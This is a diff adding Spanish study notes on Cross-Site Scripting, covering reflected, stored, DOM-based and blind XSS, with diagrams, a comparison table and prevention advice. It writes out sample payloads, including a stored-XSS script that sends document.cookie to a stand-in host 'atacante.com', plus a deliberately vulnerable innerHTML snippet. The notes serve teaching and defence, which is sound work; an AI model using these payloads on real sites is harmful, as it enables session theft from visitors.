@@ -41,3 +41,123 @@ javascript:alert(document.cookie)
 javascript:alert(1)
 '-alert(1)-'
 ```
+
+
+---
+
+# Cross-Site Scripting (XSS)
+
+> [!SUMMARY] Definición
+> El **Cross-Site Scripting (XSS)** es una vulnerabilidad que permite a un atacante inyectar scripts maliciosos (generalmente JavaScript) en páginas web vistas por otros usuarios.
+> 
+> **Diferencia clave:** A diferencia de una inyección SQL (que ataca la base de datos), el XSS ataca al **usuario** que visita la web.
+
+---
+
+## 1. XSS Reflejado (Reflected)
+El script malicioso viaja en la solicitud (URL) y el servidor lo "refleja" de vuelta en la respuesta. Es temporal y requiere ingeniería social.
+
+> [!EXAMPLE] Vector de Ataque
+> El atacante envía un enlace malicioso a la víctima (Phishing).
+> `http://sitio.com/buscar?q=<script>alert('XSS')</script>`
+
+**Flujo del ataque:**
+
+```mermaid
+sequenceDiagram
+    participant Atacante
+    participant Victima
+    participant Servidor
+    
+    Atacante->>Victima: Envía enlace malicioso (Email/Chat)
+    Victima->>Servidor: Clic en enlace (Request + Script)
+    Servidor-->>Victima: Responde con la web + Script reflejado
+    Note right of Victima: El navegador ejecuta el script
+
+
+## 2. XSS Almacenado (Stored / Persistent)
+
+Es el más peligroso. El script se guarda permanentemente en el servidor (Base de Datos, Logs, Comentarios).
+
+> [!DANGER] Impacto
+> 
+> No requiere que la víctima haga clic en un enlace especial. Simplemente visitar la página infectada ejecuta el código. Afecta a todos los visitantes.
+
+Ejemplo de inyección:
+
+En un foro o sección de comentarios:
+
+HTML
+
+```
+Hola a todos!
+<script>
+  fetch('[http://atacante.com/robador?cookie=](http://atacante.com/robador?cookie=)' + document.cookie);
+</script>
+```
+
+**Flujo del ataque:**
+
+Fragmento de código
+
+```
+graph LR
+    A[Atacante] -->|POST: Comentario + Script| B[(Base de Datos)]
+    B -->|Carga contenido| C[Servidor Web]
+    C -->|Sirve página infectada| D[Víctima 1]
+    C -->|Sirve página infectada| E[Víctima 2]
+    C -->|Sirve página infectada| F[Admin]
+```
+
+---
+
+## 3. XSS basado en DOM (DOM-based)
+
+La vulnerabilidad ocurre completamente en el **cliente (navegador)**. El servidor puede enviar una página segura, pero el JavaScript del cliente manipula los datos de forma insegura.
+
+- **Source (Fuente):** De dónde vienen los datos (ej: `location.hash`, `location.search`).
+    
+- **Sink (Sumidero):** Dónde se ejecutan (ej: `innerHTML`, `document.write`, `eval`).
+    
+
+> [!BUG] Código Vulnerable (Ejemplo)
+> 
+> JavaScript
+> 
+> ```
+> // El script toma el hash de la URL y lo escribe en el HTML sin sanitizar
+> var userConfig = location.hash.substring(1);
+> document.getElementById("welcome-msg").innerHTML = userConfig;
+> ```
+> 
+> _Si la URL es `sitio.com#<img src=x onerror=alert(1)>`, el código se ejecuta._
+
+---
+
+## Tabla Comparativa
+
+|**Tipo**|**Ubicación del Payload**|**Persistencia**|**Interacción requerida**|
+|---|---|---|---|
+|**Reflejado**|En la URL (Solicitud)|No (Un solo uso)|Alta (Clic en enlace)|
+|**Almacenado**|Base de Datos (Servidor)|Sí (Permanente)|Baja (Solo visitar)|
+|**DOM-based**|DOM del Navegador|Depende de la fuente|Variable|
+
+---
+
+### Variantes Avanzadas
+
+> [!WARNING] Blind XSS
+> 
+> Una variante del Stored XSS donde el atacante inyecta código en un lugar que no puede ver (ej: formulario de contacto, logs de errores).
+> 
+> El payload se detona días o semanas después cuando un **Administrador** revisa esos datos en un panel interno, permitiendo el robo de sesiones privilegiadas.
+
+---
+
+## [[Prevención y Mitigación]]
+
+- **Sanitización de entrada:** Limpiar datos recibidos.
+    
+- **Codificación de salida (Output Encoding):** Convertir caracteres especiales en entidades HTML (ej: `<` a `&lt;`).
+    
+- **CSP ([[Content Security Policy]]):** Restringir los dominios desde donde se pueden cargar scripts.
